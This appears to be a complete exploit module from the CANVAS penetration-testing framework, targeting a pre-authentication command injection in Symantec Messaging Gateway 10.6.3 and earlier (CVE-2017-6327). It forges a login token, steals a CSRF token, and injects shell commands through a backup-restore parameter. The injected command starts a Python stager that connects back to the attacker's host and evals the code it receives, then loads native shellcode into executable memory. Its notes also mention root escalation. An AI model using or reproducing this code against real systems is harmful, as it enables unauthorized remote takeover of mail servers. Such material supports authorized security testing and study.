#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

# import libs.spkproxy as spkproxy
import urllib
import base64


from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory


from Crypto.Hash import MD5
from Crypto.Cipher import DES

import random
import string
import urllib2
import cookielib
import ssl
import re
from HTMLParser import HTMLParser
from contextlib import contextmanager
import collections



NAME                           = "Symantec Brightmail Pre-Auth Command Injection"
DESCRIPTION                    = "Symantec Messaging Gateway <= 10.6.3 Pre-Auth Command Injection"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://symantec.com"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2017-6327"
DOCUMENTATION["CVE URL"]       = ""
DOCUMENTATION["References"]    = ["https://www.exploit-db.com/exploits/42519/",
                                  "http://seclists.org/fulldisclosure/2017/Aug/28"]

DOCUMENTATION['Notes']         = """
Tested on: Symantec Messaging Gateway 10.6.3 Appliance

SPECIAL: on SMG versions <= 10.6.3, our linux_foll_write_cow will
escalate to root privileges on those systems.
"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ "Linux" ]
PROPERTY['VERSION']            = [ "All" ]

HTTPResponse = collections.namedtuple('HTTPResponse', 'cookies content')

def escape_chars(string):
    return "".join(["\\x%02x" % ord(x) for x in string])

template_python_stager = ";".join(["import socket",
                                   "x = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                                   "x.connect((\"STRING_IP\", INT_PORT))",
                        
                                   # Recv is not guaranteed to return the the number of bytes specified by the argument
                                   # "code = x.recv(INT_CODE_LENGTH)",
                                   "code = \"\".join([x.recv(1) for i in range(0, INT_CODE_LENGTH)])",
                                   "x.close()",
                                   "eval(compile(code, \"\", \"exec\"))"])



template_python_x64_mosdef_loader = """
def mosdef_start():
    import ctypes
    from ctypes import pythonapi

    payload_bytes = "INSERT_MOSDEF_HERE"
    payload = ctypes.create_string_buffer(payload_bytes, len(payload_bytes))

    PROT_NONE=0
    PROT_READ=1
    PROT_WRITE=2
    PROT_EXEC=4

    page_size = pythonapi.getpagesize()
    payload_addr = ctypes.addressof(payload)
    payload_size = ctypes.sizeof(payload)


    shellcode_page_lower = (payload_addr & ctypes.c_ulonglong(~(page_size-1)).value)
    shellcode_page_upper = ((payload_addr + payload_size) & ctypes.c_ulonglong(~(page_size-1)).value) + page_size
    shellcode_page_size = shellcode_page_upper - shellcode_page_lower

    pythonapi.mprotect(shellcode_page_lower, shellcode_page_size, PROT_READ|PROT_WRITE|PROT_EXEC)
    
    entry_point = ctypes.cast(payload, ctypes.CFUNCTYPE(ctypes.c_void_p))
    entry_point()
mosdef_start()
"""


@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

class CSRFExtractor(HTMLParser):
    check_attrs = [("type", "hidden"),
                   ("name", "symantec.brightmail.key.TOKEN")]

    def handle_starttag(self, tag, attrs):
        if self.csrf_token is None:
            if str(tag).lower() == "input":
                if all([attr in attrs for attr in CSRFExtractor.check_attrs]):
                    value_attr = [x for x in attrs if str(x[0]) == "value"][0]
                    self.csrf_token = value_attr[1]
    

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.host                  = ""
        self.port                  = 443
        self.version               = 1
        self.name                  = NAME

        self.hostname              = ""
        self.vhost                 = ""
        self.vhosts                = None
        self.vulnerable_targets    = None
        self.protocol              = "https"
        self.basepath              = "/brightmail"
        self.ssl                   = True
        self.cookies               = ""
        self.extraheaders          = ""
        self.discover              = False

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def getargs(self):
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("ssl")
        self.getarg("vhost")
        self.getarg("basepath")
        self.getarg("discover")

        if self.ssl:
            self.protocol="https"

        logging.info("basepath:" + self.basepath)

        if self.basepath is None:
            self.basepath = "/brightmail/"

        if not self.basepath.startswith("/"):
            self.basepath="/"+self.basepath
        if not self.basepath.endswith("/"):
            self.basepath=self.basepath + "/"

        self.getarg('cookies')

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.LINUXMOSDEF_X64]

    def http_get(self, url, cookie=None):
        with no_timeout_socket():
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

            jar = cookielib.CookieJar()
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ssl_ctx), urllib2.HTTPCookieProcessor(jar))
            if cookie is not None:
                cookie_contents = "; ".join(["%s=%s" % (key, value) for key, value in cookie.iteritems()])

                opener.addheaders.append(('Cookie', cookie_contents))

            if self.vhost is not None:
                opener.addheaders.append(("Host", self.vhost))

            handle = opener.open(url)

            cookies = {cookie.name:cookie.value for cookie in jar}

            return HTTPResponse(cookies=cookies, content=handle.read())
            

    def run_blind_command(self, command):
        evil = "%s`%s`%s" % (self.gen_random_str(), command, self.gen_random_str())

        params={"method":"performRestore",
                "restoreSource":"APPLIANCE", # line 108 of RestoreAction.class
                "symantec.brightmail.key.TOKEN":self.csrf_token,
                "localBackupFileSelection":evil}

        request = self.basepath + "admin/restore/action5.do" + "?" + urllib.urlencode(params)
        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

        response = self.http_get(url, {"JSESSIONID": self.jsession_id})

        return True


    def gen_random_str(self, size=10, chars=string.ascii_letters):
        return ''.join(random.choice(chars) for x in range(size))

    def get_random_salt(self):
        return "".join([chr(random.randint(0, 0xff)) for i in range(0, 8)])

    def generate_key(self, seed, salt, count=1000):
        md5_hasher = MD5.new()

        result = seed + salt

        for i in range(0, count):
            md5_hasher = MD5.new()
            md5_hasher.update(result)
            result = md5_hasher.digest()

        return (result[:8], result[8:])
    
    def get_fake_user_data(self, email="temp_user@fakewebsite.lp"):
        iterations = 1000
        password = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;':\"\\{}`~!@#$%^&*()_+-="

        salt = self.get_random_salt()

        (first, second) = self.generate_key(password, salt)

        # Padding -  RFC 2898 Section 6.1 
        pad_count = 8 - len(email) % 8 
        email_padded = email + (chr(pad_count)*pad_count)

        des = DES.new(first, DES.MODE_CBC, second)
        ciphertext = des.encrypt(email_padded)

        return (salt, ciphertext)

    def inject_user(self):
        email = "%s@%s.com" % (self.gen_random_str(), self.gen_random_str())
        
        (salt, email_ciphertext) = self.get_fake_user_data(email)
        auth_data = base64.b64encode(salt) + base64.b64encode(email_ciphertext)
        params = {"method": "notificationLogin",
                  "notify": auth_data}

        request = self.basepath + "action1.do" + "?" + urllib.urlencode(params)
        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request
        
        logging.info("[inject_user] url:" + url)

        # Commented out due to SSL "handshake failure" problem!
        """
        (handle, code) = spkproxy.urlopen(url,
                                          data="",
                                          exploit=self,
                                          entireresponse=True,
                                          return_response_code=True,
                                          # auth=self.auth,
                                          verb="GET")
        response = handle.read()
        """
        response = self.http_get(url)

        return (auth_data, response.cookies["JSESSIONID"])

    def get_csrf_token(self):
        request = self.basepath + "common.jsp"
        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

        
        
        response = self.http_get(url, {"JSESSIONID":self.jsession_id})

        parser = CSRFExtractor()
        parser.csrf_token = None
        parser.feed(response.content)
        
        return parser.csrf_token

    def create_native_python_mosdef(self):
        ip_bytes = ["%02x" % ord(byte) for byte in socket.inet_aton(self.callback.ip)]
        
        if len(ip_bytes) < 4:
            ip_bytes = "\x00"* (4-len(ip_bytes))

        cback_addr = "0x"+"".join(ip_bytes)
        cback_port = self.callback.port
        mosdef_type = 22

        cc_args = ["-c", "-k", "2.6", "-t", "24",
                   "-D", "__AMD64__",
                   "-D", "CBACK_ADDR=%s" % cback_addr,
                   "-D", "CBACK_PORT=%d" % cback_port,
                   "-D", "MOSDEF_TYPE=%d" % mosdef_type,
                   "-v",
                   "-m", "Linux",
                   "-p", "X64",
                   os.path.join(canvas_root_directory, "backdoors", "cback_mmap_rwx.c")]

        threadsafe_cc_main(cc_args)

        with open(os.path.join(canvas_root_directory, "cback_mmap_rwx.sc"), "rb") as handle:
            shellcode_data = handle.read()
            shellcode_data = ("A" if len(shellcode_data) % 2 != 0 else "") + shellcode_data 
            payload = escape_chars(shellcode_data)

        python_x64_mosdef_loader = template_python_x64_mosdef_loader.replace("INSERT_MOSDEF_HERE", payload)

        return python_x64_mosdef_loader

    def test(self):
        request = self.basepath
        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

        response = self.http_get(url)
        
        if response is not None:
            result = re.search('loginProductVersion">\s*Version (?P<version>[^\s]*)', response.content)
            if result is not None:
                return result.group(1) <= "10.6.3"

        return False

    def load_mosdef(self):
        succeeded = False
        listener = None
        stager_port = None
        tries = 0 

        while not succeeded or tries < 5:
            stager_port = random.randint(1025, 0xffff)
            
            try:
                listener = self.gettcplistener(stager_port)
            except:
                pass
            else:
                if listener:
                    succeeded = True

            tries += 1

        if not succeeded:
            logging.error("unable to start stager listener!!")
            return None

        payload = self.create_native_python_mosdef()

        python_stager = template_python_stager.replace("STRING_IP", self.callback.ip).replace("INT_PORT", str(stager_port)).replace("INT_CODE_LENGTH", str(len(payload)))

        (handle, address) = (None, None)
        succeeded = False

        while not succeeded and self.state != "HALT":
            try:
                self.run_blind_command("python -c '%s'" % python_stager)
                (handle, address) = listener.accept()
            except:
                logging.error("No python stager connectback!")
            else:
                succeeded = True

        handle.sendall(payload)
        handle.close()
        
        logging.info("Sent native-MOSDEF loader!")
        

    def run(self):
        self.getargs()
        
        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))
        (self.auth_data, self.jsession_id) = self.inject_user()
        self.csrf_token = self.get_csrf_token()

        logging.info("auth_data:" + self.auth_data)
        logging.info("csrf_token:" + self.csrf_token)
        logging.info("callback ip:%s, callback port:%d" % (self.callback.ip, self.callback.port))
        
        self.load_mosdef()

        # This is to appease ISucceeded.
        time.sleep(1)

        if self.ISucceeded():
            logging.warning("Module succeeded")
            self.setInfo("%s - done (success)" % (NAME))
            return 1
        else:
            logging.error('Module failed')
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
